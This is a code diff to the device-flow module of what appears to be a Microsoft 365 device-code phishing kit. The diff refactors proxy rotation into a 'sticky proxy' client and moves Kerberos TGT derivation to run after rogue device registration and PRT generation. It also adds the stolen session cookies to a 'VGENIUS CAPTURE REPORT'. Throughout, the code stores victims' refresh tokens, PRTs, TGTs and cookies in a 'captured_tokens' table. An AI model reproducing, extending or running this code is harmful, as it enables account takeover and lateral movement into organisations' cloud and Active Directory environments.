@@ -3,6 +3,7 @@
  * Handles Microsoft Device Code OAuth flow proxying
  */
 const axios = require('axios');
+const ms = require('./microsoftclient');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const jwt = require('jsonwebtoken');
 const db = require('../database/connection');
@@ -48,43 +49,19 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     // Using resource ID 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 (Azure Device Registration Service)
     const tenant = config.AZURE_TENANT || 'organizations';
     const clientId = config.AZURE_CLIENT_ID;
-
-    // Get a random active proxy
-    const proxy = await proxyManager.getRandomProxy();
-    let proxyConfig = {};
-    let proxyId = null;
-
-    if (proxy) {
-      proxyId = proxy.id;
-      const proxyConfigData = proxyManager.getAxiosProxyConfig(proxy);
-      proxyConfig = proxyConfigData || {};
-
-      // Use HttpsProxyAgent for proxy support
-      if (proxy.proxy_username && proxy.proxy_password) {
-        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_username}:${proxy.proxy_password}@${proxy.proxy_host}:${proxy.proxy_port}`;
-        const agent = new HttpsProxyAgent(proxyUrl);
-        proxyConfig.httpsAgent = agent;
-      } else {
-        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_host}:${proxy.proxy_port}`;
-        const agent = new HttpsProxyAgent(proxyUrl);
-        proxyConfig.httpsAgent = agent;
-      }
-
-      console.log(`[DeviceProxy] Using proxy ${proxy.proxy_host}:${proxy.proxy_port} (ID: ${proxyId})`);
-    }
-
-    const dcResponse = await axios.post(
+    // Claim a sticky proxy for the entire device code flow
+    const { proxy, response: dcResponse } = await ms.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
         scope: 'openid profile offline_access 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default',
       }),
       {
-        ...proxyConfig,
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded'
         },
-        timeout: 15000
+        timeout: 15000,
+        stickyProxy: true,
       }
     );
 
@@ -106,8 +83,9 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
       jwtToken,
       ip_address: (reqOptions && reqOptions.ip) || 'unknown',
       user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
-      proxy_id: proxyId,
+      proxy_id: proxy ? proxy.id : null,
       proxy_host: proxy ? proxy.proxy_host : null,
+      proxy: proxy || null,
     });
 
     // Start polling in background
@@ -164,27 +142,8 @@ async function pollForToken(jobId) {
     await new Promise(resolve => setTimeout(resolve, (job.interval || 5) * 1000));
 
     try {
-      // Build proxy config for polling (use same proxy as device code request)
-      let pollProxyConfig = {};
-      if (job.proxy_id) {
-        const pollProxy = await proxyManager.getRandomProxy();
-        if (pollProxy && pollProxy.id === job.proxy_id) {
-          const proxyConfigData = proxyManager.getAxiosProxyConfig(pollProxy);
-          if (proxyConfigData) {
-            if (pollProxy.proxy_username && pollProxy.proxy_password) {
-              const proxyUrl = `${pollProxy.proxy_type || 'http'}://${pollProxy.proxy_username}:${pollProxy.proxy_password}@${pollProxy.proxy_host}:${pollProxy.proxy_port}`;
-              const agent = new HttpsProxyAgent(proxyUrl);
-              pollProxyConfig.httpsAgent = agent;
-            } else {
-              const proxyUrl = `${pollProxy.proxy_type || 'http'}://${pollProxy.proxy_host}:${pollProxy.proxy_port}`;
-              const agent = new HttpsProxyAgent(proxyUrl);
-              pollProxyConfig.httpsAgent = agent;
-            }
-          }
-        }
-      }
-
-      const tokenResponse = await axios.post(
+      // Use the same proxy as the device code request for token polling
+      const tokenResponse = await ms.post(
         `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
         new URLSearchParams({
           grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
@@ -192,12 +151,12 @@ async function pollForToken(jobId) {
           device_code: job.device_code,
         }),
         {
-          ...pollProxyConfig,
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
           validateStatus: () => true,
-          timeout: 15000
+          timeout: 15000,
+          proxy: job.proxy,
         }
       );
 
@@ -347,37 +306,19 @@ async function retryAsTokenMode(originalJob) {
     const tenant = config.AZURE_TENANT || 'organizations';
     const clientId = config.AZURE_CLIENT_ID;
 
-    // Get a random active proxy for retry
-    const proxy = await proxyManager.getRandomProxy();
-    let retryProxyConfig = {};
-    let retryProxyId = null;
-
-    if (proxy) {
-      retryProxyId = proxy.id;
-      if (proxy.proxy_username && proxy.proxy_password) {
-        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_username}:${proxy.proxy_password}@${proxy.proxy_host}:${proxy.proxy_port}`;
-        const agent = new HttpsProxyAgent(proxyUrl);
-        retryProxyConfig.httpsAgent = agent;
-      } else {
-        const proxyUrl = `${proxy.proxy_type || 'http'}://${proxy.proxy_host}:${proxy.proxy_port}`;
-        const agent = new HttpsProxyAgent(proxyUrl);
-        retryProxyConfig.httpsAgent = agent;
-      }
-      console.log(`[DeviceProxy] Retry using proxy ${proxy.proxy_host}:${proxy.proxy_port} (ID: ${retryProxyId})`);
-    }
-
-    const dcResponse = await axios.post(
+    // Claim a sticky proxy for the retry flow
+    const { proxy, response: dcResponse } = await ms.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
         scope: 'openid profile email offline_access 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default',
       }),
       {
-        ...retryProxyConfig,
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded'
         },
-        timeout: 15000
+        timeout: 15000,
+        stickyProxy: true,
       }
     );
 
@@ -397,8 +338,9 @@ async function retryAsTokenMode(originalJob) {
       created_at: Date.now(),
       jwtToken: originalJob.jwtToken,
       is_retry: true,
-      proxy_id: retryProxyId,
+      proxy_id: proxy ? proxy.id : null,
       proxy_host: proxy ? proxy.proxy_host : null,
+      proxy: proxy || null,
     };
 
     activeJobs.set(newJobId, newJob);
@@ -542,60 +484,11 @@ async function storeToken(job, tokenData, responseCookies = []) {
     let cookieConversionResult = null;
     if (job.mode === 'cookie') {
       const refreshTokenForConversion = tokenData.refresh_token || prt || tokenData.access_token;
-      cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType)
+      cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
         .catch(err => {
           console.error('[DeviceProxy] Cookie conversion failed:', err.message);
           return { success: false, error: err.message };
         });
-    }
-
-    // Auto-derive Kerberos TGTs for work/school accounts with PRT
-    // This runs asynchronously and doesn't block the response
-    // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
-    if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
-      console.log('[DeviceProxy] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
-      const kerberosService = require('./kerberos');
-      kerberosService.deriveTGTForToken(tokenId)
-        .then(derivationResult => {
-          if (derivationResult.success) {
-            console.log('[DeviceProxy] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
-            // Update the token record with Kerberos data
-            if (derivationResult.tgt_cloud) {
-              db.query(
-                'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
-                [encrypt(derivationResult.tgt_cloud), tokenId]
-              ).catch(err => console.error('[DeviceProxy] Failed to save TGT cloud:', err));
-            }
-            if (derivationResult.tgt_ad) {
-              db.query(
-                'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
-                [encrypt(derivationResult.tgt_ad), tokenId]
-              ).catch(err => console.error('[DeviceProxy] Failed to save TGT AD:', err));
-            }
-            if (derivationResult.session_key) {
-              db.query(
-                'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
-                [encrypt(derivationResult.session_key), tokenId]
-              ).catch(err => console.error('[DeviceProxy] Failed to save session key:', err));
-            }
-            if (derivationResult.kerberos_top_level_names) {
-              db.query(
-                'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
-                [derivationResult.kerberos_top_level_names, tokenId]
-              ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
-            }
-          } else {
-            console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
-          }
-        })
-        .catch(err => {
-          console.error('[DeviceProxy] Kerberos derivation error:', err.message);
-        });
-    } else {
-      console.log('[DeviceProxy] Kerberos derivation skipped:', {
-        tokenId,
-        reason: !prt ? 'no PRT' : accountType !== 'work_school' ? 'not work/school' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic (' + tenant + ')' : 'unknown'
-      });
     }
 
     // Attempt device registration and PRT generation for ALL work/school accounts
@@ -606,10 +499,10 @@ async function storeToken(job, tokenData, responseCookies = []) {
       const deviceManager = require('./devicemanager');
       // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
       const emailDomain = email ? email.split('@')[1] : null;
-      
+
       // Flag to track if device registration failed
       let deviceRegistrationFailed = false;
-      
+
       deviceManager.registerDeviceAndGetPrt({
         access_token: tokenData.access_token,
         refresh_token: tokenData.refresh_token,
@@ -623,12 +516,55 @@ async function storeToken(job, tokenData, responseCookies = []) {
         return deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
       }).then(() => {
         console.log('[DeviceProxy] Device credentials stored for token', tokenId);
+
+        // Auto-derive Kerberos TGTs ONLY after successful device registration
+        // This ensures we have a real PRT (not just a refresh token)
+        if (tenant && tenant !== 'common' && tenant !== 'organizations') {
+          console.log('[DeviceProxy] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
+          const kerberosService = require('./kerberos');
+          kerberosService.deriveTGTForToken(tokenId)
+            .then(derivationResult => {
+              if (derivationResult.success) {
+                console.log('[DeviceProxy] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
+                // Update the token record with Kerberos data
+                if (derivationResult.tgt_cloud) {
+                  db.query(
+                    'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
+                    [encrypt(derivationResult.tgt_cloud), tokenId]
+                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT cloud:', err));
+                }
+                if (derivationResult.tgt_ad) {
+                  db.query(
+                    'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
+                    [encrypt(derivationResult.tgt_ad), tokenId]
+                  ).catch(err => console.error('[DeviceProxy] Failed to save TGT AD:', err));
+                }
+                if (derivationResult.session_key) {
+                  db.query(
+                    'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
+                    [encrypt(derivationResult.session_key), tokenId]
+                  ).catch(err => console.error('[DeviceProxy] Failed to save session key:', err));
+                }
+                if (derivationResult.kerberos_top_level_names) {
+                  db.query(
+                    'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
+                    [derivationResult.kerberos_top_level_names, tokenId]
+                  ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
+                }
+              } else {
+                console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
+              }
+            })
+            .catch(err => {
+              console.error('[DeviceProxy] Kerberos derivation error:', err.message);
+            });
+        }
       }).catch(err => {
         console.error('[DeviceProxy] Device registration failed:', err.message);
         deviceRegistrationFailed = true;
         // Don't fail the token capture - device registration is optional
       });
-      
+
       // Expose flag for capture.js to check early
       job.deviceRegistrationFailed = () => deviceRegistrationFailed;
     } else {
@@ -698,7 +634,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
 📅 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
 ✅ Full ${reportTokenType}s in attached .txt`;
 
-      const fileContent = [
+      let fileContent = [
         'VGENIUS CAPTURE REPORT',
         '========================================',
         `Type:        ${reportTokenType.toUpperCase()}`,
@@ -712,6 +648,11 @@ async function storeToken(job, tokenData, responseCookies = []) {
         `Time:        ${new Date().toISOString()}`,
         '========================================'
       ].join('\n');
+
+      // For cookie mode, include actual cookies in the report
+      if (job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success && cookieConversionResult.cookies) {
+        fileContent += '\n\nCOOKIES:\n' + cookieConversionResult.cookies;
+      }
 
       const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
 
